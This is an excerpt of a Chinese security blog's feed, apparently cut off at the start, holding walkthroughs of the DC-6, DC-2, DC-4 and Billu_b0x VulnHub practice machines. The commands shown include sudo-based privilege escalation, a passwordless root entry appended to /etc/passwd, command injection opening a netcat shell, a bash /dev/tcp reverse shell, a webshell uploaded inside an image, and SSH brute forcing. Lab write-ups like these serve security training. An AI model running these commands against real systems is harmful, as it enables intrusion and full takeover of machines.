class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -l</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/03/5cf541d24d98622667.png" alt="14.png"><br>能使用<code>jens</code>的身份运行<code>backups.sh</code>意味着我能成为<code>jens</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ echo &quot;/bin/sh&quot; &gt; backups.sh</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh</span><br><span class="line">$ id</span><br><span class="line">uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">jens@dc-6:~$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure><p>将使用<strong>Nmap提权</strong><br>低版本(2.02-5.21)可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ sudo nmap nmap --interactive+</span><br><span class="line">!sh</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p>高版本，插件提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jens@dc-6:~$ echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &gt; TE.nse</span><br><span class="line">jens@dc-6:~$ sudo nmap --script=/home/jens/TE.nse</span><br><span class="line">#python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;    #尽管执行了命令但是不显示</span><br><span class="line">root@dc-6:/home/jens# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-6:~# cat theflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/04/5cf54c5c298cf19134.png" alt="16.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DC-5&quot;&gt;&lt;a href=&quot;#DC-5&quot; class=&quot;headerlink&quot; title=&quot;DC-5&quot;&gt;&lt;/a&gt;DC-5&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：找到flag（提示随着页面刷新而改变的东西，没有涉及phpmailer漏洞）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-5,314/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-5,314/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对于DC-2和DC-4的测试</title>
    <link href="http://www.lanbainan.cn/2019/05/23/2019-05-23/"/>
    <id>http://www.lanbainan.cn/2019/05/23/2019-05-23/</id>
    <published>2019-05-23T09:49:00.000Z</published>
    <updated>2019-05-29T05:26:00.033Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>主机NET模式<br>实验目的：找到flag（5个flag）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-2,311/</a><br><a id="more"></a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/23/5ce66bb238dd454686.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.143</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br></pre></td></tr></table></figure></p><p>登录观察网页<br><img src="https://i.loli.net/2019/05/23/5ce66c7f58e3d51462.png" alt="2.png"><br>注：这里需要在host文件中添加<code>192.168.67.143 dc-2</code></p><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="https://i.loli.net/2019/05/23/5ce66dfe9aa8569460.png" alt="3.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>根据提示需要使用<a href="https://www.4hou.com/tools/14693.html" target="_blank" rel="noopener">cewl</a>，并且密码尽可能多,<code>cewl</code>是根据爬取网站内容的关键字生成一份字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cewl http://dc-2 -w /root/Desktop/passwd.txt</span><br><span class="line">Username：jerry，Password：adipiscing</span><br><span class="line">Username：tom，Password：parturient</span><br></pre></td></tr></table></figure></p><p>使用<code>jerry</code>登录<code>http://dc-2/wp-login.php</code><br><img src="https://i.loli.net/2019/05/24/5ce78742887f969239.png" alt="4.png"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>flag2提示可以使用WordPress，并且还有其他捷径<br>7744开着ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ ssh tom@192.168.67.143 -p 7744</span><br><span class="line">tom@DC-2:~$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C-2:~$ compgen -c #查看当前可以命令</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cee16fb2e9c949538.png" alt="6.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ less flag3.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/24/5ce78fc8d8f9592435.png" alt="7.png"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>提示关键词<code>jerry</code>和<code>su</code><br><img src="https://i.loli.net/2019/05/24/5ce78bffe706535795.png" alt="5.png"><br>熟悉的<code>rbash逃逸</code>,可以利用<code>vi编辑器</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH</span><br><span class="line">/usr/bin:/home/tom/usr/bin</span><br><span class="line">$ export PATH=$PATH:/bin:/usr/bin</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su jerry</span><br><span class="line">jerry@DC-2:/home/tom$</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ cat flag4.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/24/5ce7954c50cc376445.png" alt="8.png"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>提示<code>git</code>,<br>小提示:<code>git</code>在帮助状态下通过可以通过<code>!/bin/bash进入</code>交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p --help</span><br><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/24/5ce798c0bde5f91805.png" alt="9.png"></p><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><p>主机NET模式<br>实验目的：找到flag（1个flag，多个入口）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-4,313/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/27/5ceb493f64ce634899.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.145</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br></pre></td></tr></table></figure></p><p>打开网页<br><img src="https://i.loli.net/2019/05/29/5cedd3a583b1568402.png" alt="12.png"><br>提示admin登录，使用burp爆破<br><img src="https://i.loli.net/2019/05/29/5cedd312294aa52635.png" alt="11.png"><br>登录后发现命令注入<br><img src="https://i.loli.net/2019/05/29/5ceddcaa7b7a912444.png" alt="13.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/29/5ceddff46b8a770115.png" alt="14.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">radio=nc -vlp 4444 -e /bin/bash&amp;submit=Run</span><br><span class="line">λ nc -nv 192.168.67.145 444</span><br><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">www-data@dc-4:/usr/share/nginx/html$</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/usr/share/nginx/html$ cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cedeace3e3e785099.png" alt="15.png"><br>四个用户<code>charles</code>、<code>jim</code>、<code>sam</code>、<code>root</code><br>在<code>jim</code>目录下发现<code>old-passwords.bak</code><br>爆破4个用户的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# hydra -L user -P old-passwords 192.168.67.145 ssh</span><br><span class="line">[22][ssh] host: 192.168.67.145   login: jim   password: jibril04</span><br></pre></td></tr></table></figure></p><p>root发给jim的<strong>一封信</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure></p><p>前往<code>/var/mail</code>寻找线索,发现一份<code>charles</code>给<code>jim</code>的信<br><code>charles</code>度假去了把密码给了<code>jim</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:charles</span><br><span class="line">password:^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure></p><p>当切换至<code>charles</code>时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p><p>发现<code>teehee</code>以root权限运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:~$ echo &quot;EV::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd # -a附加到指定文件，不覆盖</span><br><span class="line">charles@dc-4:~$ su EV</span><br><span class="line">root@dc-4:/home/charles#</span><br></pre></td></tr></table></figure></p><h3 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-4:/root# cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/29/5cee1570e7bdb60329.png" alt="16.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;DC-2&quot;&gt;&lt;a href=&quot;#DC-2&quot; class=&quot;headerlink&quot; title=&quot;DC-2&quot;&gt;&lt;/a&gt;DC-2&lt;/h1&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：找到flag（5个flag）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对于Billu_b0x的测试</title>
    <link href="http://www.lanbainan.cn/2019/04/16/2019-04-16/"/>
    <id>http://www.lanbainan.cn/2019/04/16/2019-04-16/</id>
    <published>2019-04-16T05:30:00.000Z</published>
    <updated>2019-04-16T11:13:25.928Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>主机NET模式<br>实验目的：拿到root权限(提示从web应用入手)<br>项目地址：<a href="https://www.vulnhub.com/entry/billu-b0x,188/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/billu-b0x,188/</a><br><a id="more"></a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb56b18305f1.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.138</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)</span><br><span class="line">|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)</span><br><span class="line">|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_http-title: --==[[IndiShell Lab]]==--</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57238c6f7f.png" alt="2.png"></p><h2 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h2><p>提示使用sql注入，第一时间想到post注入（技术不过关），但是无果<br>爆破目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.67.138 /usr/share/dirb/wordlists/big.txt</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57306662f6.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.138/add #文件上传无回显</span><br><span class="line">http://192.168.67.138/in #phpinfo</span><br><span class="line">http://192.168.67.138/test #提示文件包含</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57706a2983.png" alt="4.png"><br>下载源码<br>get请求无果，post请求<br><img src="https://i.loli.net/2019/04/16/5cb577070a0ae.png" alt="5.png"><br>passwd中<code>ica</code>和<code>root</code>可以登录ssh<br>下载c.php发现mysql账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">billu</span><br><span class="line">b0x_billu</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb57dd9d5e12.png" alt="6.png"><br>登录<code>http://192.168.67.138</code><br>发现一个新的上传点<br><img src="https://i.loli.net/2019/04/16/5cb57ed3b1439.png" alt="7.png"><br>检查文件内容改名无法达到目的，上传图片马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php 2.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb584d502842.png" alt="8.png"><br>进入<code>http://192.168.67.138/uploaded_images/</code><br>分析<code>panel.php</code>发现文件包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;continue&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$dir=getcwd();</span><br><span class="line">$choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]);</span><br><span class="line"></span><br><span class="line">if($choice===&apos;add&apos;)</span><br><span class="line">&#123;</span><br><span class="line">       include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        if($choice===&apos;show&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        </span><br><span class="line">include($dir.&apos;/&apos;.$choice.&apos;.php&apos;);</span><br><span class="line">die();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">include($dir.&apos;/&apos;.$_POST[&apos;load&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b133d3eab.png" alt="9.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>进行URL编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.67.1/4444 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b13078bb5.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ id`</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a #查看内核版本</span><br><span class="line">cat /etc/issue #查看系统版本</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">本地提权exp</a><br>下载到本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 37292.c #赋权</span><br><span class="line">gcc 37292.c -o test #编译</span><br></pre></td></tr></table></figure></p><p>执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/tmp$ ./test</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b77f129ee.png" alt="11.png"></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：拿到root权限(提示从web应用入手)&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/billu-b0x,188/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/billu-b0x,188/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
</feed>
